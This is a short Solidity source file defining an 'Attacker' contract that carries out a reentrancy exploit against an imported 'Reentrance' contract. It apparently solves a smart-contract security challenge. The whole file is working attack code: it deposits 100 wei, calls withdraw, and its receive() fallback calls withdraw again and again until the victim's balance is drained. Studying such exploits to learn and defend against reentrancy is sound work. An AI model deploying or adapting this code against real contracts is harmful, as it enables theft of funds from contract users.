// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

import "./Reentrance.sol";

contract Attacker {
    Reentrance public victim;

    constructor(address victimAddress) {
        victim = Reentrance(victimAddress);
    }

    function attack() external payable {
        require(msg.value >= 100 wei);
        victim.donate{value: 100 wei}(address(this));
        victim.withdraw(100);
    }

    receive() external payable {
        if (address(victim).balance >= 100 wei) {
            victim.withdraw(100);
        }
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

}